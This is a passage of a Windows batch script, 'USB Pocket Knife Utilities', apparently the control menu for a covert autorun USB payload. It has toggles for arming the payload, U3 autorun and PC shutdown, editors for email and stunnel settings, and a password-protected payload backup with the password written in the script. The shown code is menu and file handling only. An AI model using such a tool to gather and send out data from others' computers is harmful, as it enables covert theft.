echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ P. Back to Components Menu                     ]
echo      [ M. Return to Main Menu                         ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto ChangeState1B
if '%choice%'=='2' goto ChangeState2B
if '%choice%'=='3' goto ChangeState3B
if '%choice%'=='4' goto ChangeState4B
if '%choice%'=='5' goto ChangeState5B
if '%choice%'=='6' goto ChangeStateShutdown
if '%choice%'=='7' goto OpenEmailConfig
if '%choice%'=='8' goto OpenStunnleConfig
if '%choice%'=='P' goto ComponentsMenu
if '%choice%'=='p' goto ComponentsMenu
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto ComponentsMenu3
::
:ChangeState1B
IF EXIST %config%\U3_Drive.cfg (REN %config%\U3_Drive.cfg _U3_Drive.cfg) ELSE (REN %config%\_U3_Drive.cfg U3_Drive.cfg)
GOTO ComponentsMenu3
:ChangeState2B
IF EXIST %config%\Disarm_Payload.cfg (REN %config%\Disarm_Payload.cfg _Disarm_Payload.cfg) ELSE (REN %config%\_Disarm_Payload.cfg Disarm_Payload.cfg)
GOTO ComponentsMenu3
:ChangeState3B
IF EXIST %config%\Safety_Check.cfg (REN %config%\Safety_Check.cfg _Safety_Check.cfg) ELSE (REN %config%\_Safety_Check.cfg Safety_Check.cfg)
GOTO ComponentsMenu3
:ChangeState4B
IF EXIST %config%\Auto_Restore.cfg (REN %config%\Auto_Restore.cfg _Auto_Restore.cfg) ELSE (REN %config%\_Auto_Restore.cfg Auto_Restore.cfg)
GOTO ComponentsMenu3
:ChangeState5B
IF EXIST %config%\Open_Drive_Logs.cfg (REN %config%\Open_Drive_Logs.cfg Open_Drive_Root.cfg) ELSE (GOTO ChangeState5B1)
GOTO ComponentsMenu3
:ChangeState5B1
IF EXIST %config%\Open_Drive_Root.cfg (REN %config%\Open_Drive_Root.cfg Open_Drive_None.cfg) ELSE (GOTO ChangeState5B2)
GOTO ComponentsMenu3
:ChangeState5B2
IF EXIST %config%\Open_Drive_None.cfg (REN %config%\Open_Drive_None.cfg Open_Drive_Logs.cfg)  ELSE (GOTO ChangeState5B)
GOTO ComponentsMenu3
:ChangeStateShutdown
IF EXIST %config%\Shutdown.cfg (REN %config%\Shutdown.cfg _Shutdown.cfg) ELSE (REN %config%\_Shutdown.cfg Shutdown.cfg)
GOTO ComponentsMenu3
:OpenEmailConfig
cls
echo Save your changes and close Notepad to continue
notepad.exe %flshdrv%\CONFIG\Email_Config.cfg
GOTO ComponentsMenu3
:OpenStunnleConfig
cls
echo Save your changes and close Notepad to continue
notepad.exe %flshdrv%\CONFIG\Stunnle_Config.cfg
GOTO ComponentsMenu3
::
:U3ComponentsMenu3
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Select the number of an item to interact       ]
echo      \________________________________________________/
echo      [                                                ]
         IF EXIST %config%\U3_Drive.cfg (ECHO      [ 1. Is this a U3 drive?                     Yes ]) ELSE (ECHO      [ 1. Is this a U3 Drive?                     No  ])
  IF EXIST %config%\_Disarm_Payload.cfg (ECHO      [ 2. Is the payload armed?                   Yes ]) ELSE (ECHO      [ 2. Is the payload armed?                   No  ])
     IF EXIST %config%\Safety_Check.cfg (ECHO      [ 3. Perform Safety.txt check                Yes ]) ELSE (ECHO      [ 3. Perform Safety.txt check                No  ])
  IF EXIST %config%\Open_Drive_Logs.cfg (ECHO      [ 4. Open What Folder When Finished?        Logs ]) ELSE (GOTO SkipDrvLogs)
GOTO OpenDrvDone
:SkipDrvLogs
  IF EXIST %config%\Open_Drive_Root.cfg (ECHO      [ 4. Open What Folder When Finished?        Root ]) ELSE (GOTO SkipDrvRoot)
GOTO OpenDrvDone
:SkipDrvRoot
  IF EXIST %config%\Open_Drive_None.cfg (ECHO      [ 4. Open What Folder When Finished?        None ]) ELSE (GOTO SkipDrvNone)
GOTO OpenDrvDone
:SkipDrvNone
ECHO      [ 4. Open What Folder When Finished?        None ]
:OpenDrvDone
         IF EXIST %config%\Shutdown.cfg (ECHO      [ 5. Shutdown PC when finished?              Yes ]) ELSE (ECHO      [ 5. Shutdown PC when finished?              No  ])
echo      [                                                ]
echo      [ 6. Edit Email Configuration                    ]
echo      [ 7. Edit Stunnle Configuration                  ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ P. Back to Components Menu                     ]
echo      [ M. Return to Main Menu                         ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto ChangeState1B
if '%choice%'=='2' goto ChangeState2B
if '%choice%'=='3' goto ChangeState3B
if '%choice%'=='4' goto ChangeState5B
if '%choice%'=='5' goto ChangeStateShutdown
if '%choice%'=='6' goto OpenEmailConfig
if '%choice%'=='7' goto OpenStunnleConfig
if '%choice%'=='P' goto ComponentsMenu
if '%choice%'=='p' goto ComponentsMenu
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto U3ComponentsMenu3
::
:ProfileMenu
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Select the number of an item to interact       ]
echo.     \________________________________________________/
echo.     [                                                ]
echo      [ 1. Load a Profile                              ]
echo      [ 2. Save a Profile                              ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ P. Back to Components Menu                     ]
echo      [ M. Back to Main Menu                           ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto ProfileMenu1
if '%choice%'=='2' goto ProfileMenu2
if '%choice%'=='P' goto ComponentsMenu
if '%choice%'=='p' goto ComponentsMenu
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto ProfileMenu
::
:ProfileMenu1
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Select a profile to load                       ]
echo.     \________________________________________________/
echo.     [                                                ]
ECHO      [ 1. Load Profile 1                              ]
ECHO      [ 2. Load Profile 2                              ]
ECHO      [ 3. Load Profile 3                              ]
echo      [                                                ]
IF EXIST %config%\PROFILES\CurrentProfile1.cfg (ECHO      [ Currently Loaded Profile             Profile 1 ]) ELSE GOTO SkipFindProfile1
GOTO FindProfileDone
:SkipFindProfile1
IF EXIST %config%\PROFILES\CurrentProfile2.cfg (ECHO      [ Currently Loaded Profile             Profile 2 ]) ELSE GOTO SkipFindProfile2
GOTO FindProfileDone
:SkipFindProfile2
IF EXIST %config%\PROFILES\CurrentProfile3.cfg (ECHO      [ Currently Loaded Profile             Profile 3 ]) ELSE GOTO SkipFindProfile3
GOTO FindProfileDone
:SkipFindProfile3
IF EXIST %config%\PROFILES\CurrentProfile0.cfg (ECHO      [ Currently Loaded Profile                  None ]) ELSE GOTO SkipFindProfileNone
GOTO FindProfileDone
:SkipFindProfileNone
echo      [ Currently Loaded Profile                  None ]
:FindProfileDone
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ P. Back to Profile Menu                        ]
echo      [ M. Back to Main Menu                           ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto LoadProfile1
if '%choice%'=='2' goto LoadProfile2
if '%choice%'=='3' goto LoadProfile3
if '%choice%'=='P' goto ProfileMenu
if '%choice%'=='p' goto ProfileMenu
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto ProfileMenu1
::
:LoadProfile1
IF NOT EXIST %config%\PROFILES\Profile1.cfg GOTO LoadProfileFail
cls
DEL /F /Q %config%\*.cfg
COPY /Y %config%\PROFILES\Profile1\*.cfg %config%\
REN %config%\PROFILES\CurrentProfile*.cfg CurrentProfile1.cfg
GOTO ProfileMenu1
:LoadProfile2
IF NOT EXIST %config%\PROFILES\Profile2.cfg GOTO LoadProfileFail
cls
DEL /F /Q %config%\*.cfg
COPY /Y %config%\PROFILES\Profile2\*.cfg %config%\
REN %config%\PROFILES\CurrentProfile*.cfg CurrentProfile2.cfg
GOTO ProfileMenu1
:LoadProfile3
IF NOT EXIST %config%\PROFILES\Profile3.cfg GOTO LoadProfileFail
cls
DEL /F /Q %config%\*.cfg
COPY /Y %config%\PROFILES\Profile3\*.cfg %config%\
REN %config%\PROFILES\CurrentProfile*.cfg CurrentProfile3.cfg
GOTO ProfileMenu1
::
:LoadProfileFail
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Error...                                       ]
echo      \________________________________________________/
echo      [                                                ]
echo      [ The selected profile does not appear to exist  ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ P. Back to Load Profile Menu                   ]
echo      [ M. Back to Main Menu                           ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='P' goto ProfileMenu1
if '%choice%'=='p' goto ProfileMenu1
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto LoadProfileFail
::
:ProfileMenu2
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Select a profile to save                       ]
echo.     \________________________________________________/
echo.     [                                                ]
       IF EXIST %config%\PROFILES\Profile1.cfg (ECHO      [ 1. Overwrite Profile 1 with Current Settings   ]) ELSE (ECHO      [ 1. Save Current Settings as Profile 1          ])
       IF EXIST %config%\PROFILES\Profile2.cfg (ECHO      [ 2. Overwrite Profile 2 with Current Settings   ]) ELSE (ECHO      [ 2. Save Current Settings as Profile 2          ])
       IF EXIST %config%\PROFILES\Profile3.cfg (ECHO      [ 3. Overwrite Profile 3 with Current Settings   ]) ELSE (ECHO      [ 3. Save Current Settings as Profile 3          ])
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ P. Back to Profile Menu                        ]
echo      [ M. Back to Main Menu                           ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto SaveProfile1
if '%choice%'=='2' goto SaveProfile2
if '%choice%'=='3' goto SaveProfile3
if '%choice%'=='P' goto ProfileMenu
if '%choice%'=='p' goto ProfileMenu
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto ProfileMenu2
::
:SaveProfile1
cls
COPY /Y %config%\*.cfg %config%\PROFILES\Profile1\
IF EXIST %config%\PROFILES\_Profile1.cfg (REN %config%\PROFILES\_Profile1.cfg Profile1.cfg)
REN %config%\PROFILES\CurrentProfile*.cfg CurrentProfile1.cfg
:SaveProfile1a
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Confirmation...                                ]
echo      \________________________________________________/
echo      [                                                ]
echo      [ Profile 1 saved sucessfully!                   ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ P. Back to Save Profile Menu                   ]
echo      [ M. Back to Main Menu                           ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='P' goto ProfileMenu2
if '%choice%'=='p' goto ProfileMenu2
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto SaveProfile1a
::
:SaveProfile2
cls
COPY /Y %config%\*.cfg %config%\PROFILES\Profile2\
IF EXIST %config%\PROFILES\_Profile2.cfg (REN %config%\PROFILES\_Profile2.cfg Profile2.cfg)
REN %config%\PROFILES\CurrentProfile*.cfg CurrentProfile2.cfg
:SaveProfile2a
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Confirmation...                                ]
echo      \________________________________________________/
echo      [                                                ]
echo      [ Profile 2 saved sucessfully!                   ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ P. Back to Save Profile Menu                   ]
echo      [ M. Back to Main Menu                           ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='P' goto ProfileMenu2
if '%choice%'=='p' goto ProfileMenu2
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto SaveProfile2a
::
:SaveProfile3
cls
COPY /Y %config%\*.cfg %config%\PROFILES\Profile3\
IF EXIST %config%\PROFILES\_Profile3.cfg (REN %config%\PROFILES\_Profile3.cfg Profile3.cfg)
REN %config%\PROFILES\CurrentProfile*.cfg CurrentProfile3.cfg
:SaveProfile3a
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Confirmation...                                ]
echo      \________________________________________________/
echo      [                                                ]
echo      [ Profile 3 saved sucessfully!                   ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ P. Back to Save Profile Menu                   ]
echo      [ M. Back to Main Menu                           ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='P' goto ProfileMenu2
if '%choice%'=='p' goto ProfileMenu2
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto SaveProfile3a
::
:BackupMenu
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Select a Backup Function to Perform            ]
echo      \________________________________________________/
echo      [                                                ]
   IF EXIST %flshdrv%\SYSTEM\BACKUP\Backup.rar (ECHO      [ 1. Update Payload Backup Archive               ]) ELSE (ECHO      [ 1. Generate Payload Backup Archive             ])
   IF EXIST %flshdrv%\SYSTEM\BACKUP\Backup.rar (ECHO      [ 2. Restore from Backup                         ]) ELSE (ECHO      [                                                ])
   IF EXIST %flshdrv%\SYSTEM\BACKUP\Backup.rar (ECHO      [ 3. Delete Current Backup                       ]) ELSE (ECHO      [                                                ])
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ M. Back to Main Menu                           ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto UpdateBackup
if '%choice%'=='2' goto RestoreBackup
if '%choice%'=='3' goto DelBackup
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto BackupMenu
::
:DelBackup
DEL .\SYSTEM\BACKUP\Backup.rar
GOTO BackupMenu
:RestoreBackup
:: Start the restore process
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Please Wait...                                 ]
echo      \________________________________________________/
echo      [                                                ]
	  IF EXIST %config%\Animation_1.cfg (ECHO      [ Restoring Backup [-]                           ])
	  IF EXIST %config%\Animation_2.cfg (ECHO      [ Restoring Backup [\]                           ])
	  IF EXIST %config%\Animation_3.cfg (ECHO      [ Restoring Backup [/]                           ])
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      \________________________________________________/

	  IF EXIST %config%\Animation_1.cfg (GOTO RestoreBackup1)
	  IF EXIST %config%\Animation_2.cfg (GOTO RestoreBackup2)
	  IF EXIST %config%\Animation_3.cfg (GOTO RestoreBackup3)

:RestoreBackup1
::Update: The copy of the backup archive is now created on C:\ because it's nearly twice as fast as
::reading from and extracting to a flash drive at the same time.
copy ".\SYSTEM\BACKUP\Backup.rar" "C:\Backup_Safe.rar"
REN %config%\Animation_*.cfg Animation_2.cfg
GOTO RestoreBackup
:RestoreBackup2
:: Here we unarchive the copy of the backup we just made
%progdir%\rar.exe x -o+ -p[4369462e7651316962562d4c6931697676652e626d366d57503b287246] "C:\Backup_Safe.rar" ".\"
REN %config%\Animation_*.cfg Animation_3.cfg
GOTO RestoreBackup
:RestoreBackup3
::And now that it's finished, we deleat the backup of the backup.
del "C:\Backup_Safe.rar"
REN %config%\Animation_*.cfg Animation_1.cfg

cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Confirmation...                                ]
echo      \________________________________________________/
echo      [                                                ]
echo      [ Restoring Backup [x] Done!                     ]
echo      [ The payload has been manually restored         ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ M. Back to Main Menu                           ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto MENU
::
:UpdateBackup
:: Update the backup archive with all latest file versions
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Please Wait...                                 ]
echo      \________________________________________________/
echo      [                                                ]
	  IF EXIST %config%\Animation_1.cfg (ECHO      [ Generating Backup [-]                          ])
	  IF EXIST %config%\Animation_2.cfg (ECHO      [ Generating Backup [\]                          ])
	  IF EXIST %config%\Animation_3.cfg (ECHO      [ Generating Backup [/]                          ])
	  IF EXIST %config%\Animation_4.cfg (ECHO      [ Generating Backup [-]                          ])
	  IF EXIST %config%\Animation_5.cfg (ECHO      [ Generating Backup [\]                          ])
	  IF EXIST %config%\Animation_6.cfg (ECHO      [ Generating Backup [/]                          ])
	  IF EXIST %config%\Animation_7.cfg (ECHO      [ Generating Backup [-]                          ])
	  IF EXIST %config%\Animation_8.cfg (ECHO      [ Generating Backup [\]                          ])
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      \________________________________________________/

	  IF EXIST %config%\Animation_1.cfg (GOTO UpdateBackup1)
	  IF EXIST %config%\Animation_2.cfg (GOTO UpdateBackup2)
	  IF EXIST %config%\Animation_3.cfg (GOTO UpdateBackup3)
	  IF EXIST %config%\Animation_4.cfg (GOTO UpdateBackup4)
	  IF EXIST %config%\Animation_5.cfg (GOTO UpdateBackup5)
 	  IF EXIST %config%\Animation_6.cfg (GOTO UpdateBackup6)
	  IF EXIST %config%\Animation_7.cfg (GOTO UpdateBackup7)
	  IF EXIST %config%\Animation_8.cfg (GOTO UpdateBackup8)

:UpdateBackup1
:: Deleat the old Backup
IF EXIST .\SYSTEM\BACKUP\Backup.rar del .\SYSTEM\BACKUP\Backup.rar
REN %config%\Animation_*.cfg Animation_2.cfg
GOTO UpdateBackup
:UpdateBackup2
:: Tags UpdateBackup2 through UpdatebackupX back up the entire payload
.\SYSTEM\PROGS\rar.exe a -hp[4369462e7651316962562d4c6931697676652e626d366d57503b287246] -inul -r -m0 ".\SYSTEM\BACKUP\Backup.rar" ".\Menu.bat"
REN %config%\Animation_*.cfg Animation_3.cfg
GOTO UpdateBackup
:UpdateBackup3
.\SYSTEM\PROGS\rar.exe a -hp[4369462e7651316962562d4c6931697676652e626d366d57503b287246] -inul -r -m0 ".\SYSTEM\BACKUP\Backup.rar" ".\Autorun.inf"
REN %config%\Animation_*.cfg Animation_4.cfg
GOTO UpdateBackup
:UpdateBackup4
.\SYSTEM\PROGS\rar.exe a -hp[4369462e7651316962562d4c6931697676652e626d366d57503b287246] -inul -r -m0 ".\SYSTEM\BACKUP\Backup.rar" ".\CONFIG\"
REN %config%\Animation_*.cfg Animation_5.cfg
GOTO UpdateBackup
:UpdateBackup5
.\SYSTEM\PROGS\rar.exe a -hp[4369462e7651316962562d4c6931697676652e626d366d57503b287246] -inul -r -m0 ".\SYSTEM\BACKUP\Backup.rar" ".\TOOLS\"
REN %config%\Animation_*.cfg Animation_6.cfg
GOTO UpdateBackup
:UpdateBackup6
.\SYSTEM\PROGS\rar.exe a -hp[4369462e7651316962562d4c6931697676652e626d366d57503b287246] -inul -r -m0 ".\SYSTEM\BACKUP\Backup.rar" ".\SYSTEM\INSTALL\"
REN %config%\Animation_*.cfg Animation_7.cfg
GOTO UpdateBackup
:UpdateBackup7
.\SYSTEM\PROGS\rar.exe a -hp[4369462e7651316962562d4c6931697676652e626d366d57503b287246] -inul -r -m0 ".\SYSTEM\BACKUP\Backup.rar" ".\SYSTEM\"
REN %config%\Animation_*.cfg Animation_8.cfg
GOTO UpdateBackup
:UpdateBackup8
.\SYSTEM\PROGS\rar.exe a -hp[4369462e7651316962562d4c6931697676652e626d366d57503b287246] -inul -r -m0 ".\SYSTEM\BACKUP\Backup.rar" ".\SYSTEM\Start.bat"
REN %config%\Animation_*.cfg Animation_1.cfg

cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Confirmation...                                ]
echo      \________________________________________________/
echo      [                                                ]
echo      [ Generating Backup [x] Done!                    ]
echo      [ The payload backup archive has been updated    ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ M. Back to Main Menu                           ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto MENU
::
:AutoUpdateConf
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ This will download and update some components. ]
echo      [ This DOES NOT download the latest version of   ]
echo      [ the entire payload.                            ]
echo      \________________________________________________/
echo      [                                                ]
echo      [ 1. Run Auto Update Script                      ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ M. Back to Main Menu                           ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto AutoUpdate
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto AutoUpdateConf
::
:AutoUpdate
:: Wget latest versions of payload apps
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Please Wait...                                 ]
echo      \________________________________________________/
echo      [                                                ]
	  IF EXIST %config%\Animation_1.cfg (ECHO      [ Downloading Files [-]                          ])
	  IF EXIST %config%\Animation_2.cfg (ECHO      [ Downloading Files [\]                          ])
	  IF EXIST %config%\Animation_3.cfg (ECHO      [ Downloading Files [/]                          ])
	  IF EXIST %config%\Animation_4.cfg (ECHO      [ Downloading Files [-]                          ])
	  IF EXIST %config%\Animation_5.cfg (ECHO      [ Downloading Files [\]                          ])
	  IF EXIST %config%\Animation_6.cfg (ECHO      [ Downloading Files [/]                          ])
	  IF EXIST %config%\Animation_7.cfg (ECHO      [ Downloading Files [-]                          ])
	  IF EXIST %config%\Animation_8.cfg (ECHO      [ Downloading Files [\]                          ])
	  IF EXIST %config%\Animation_9.cfg (ECHO      [ Downloading Files [/]                          ])
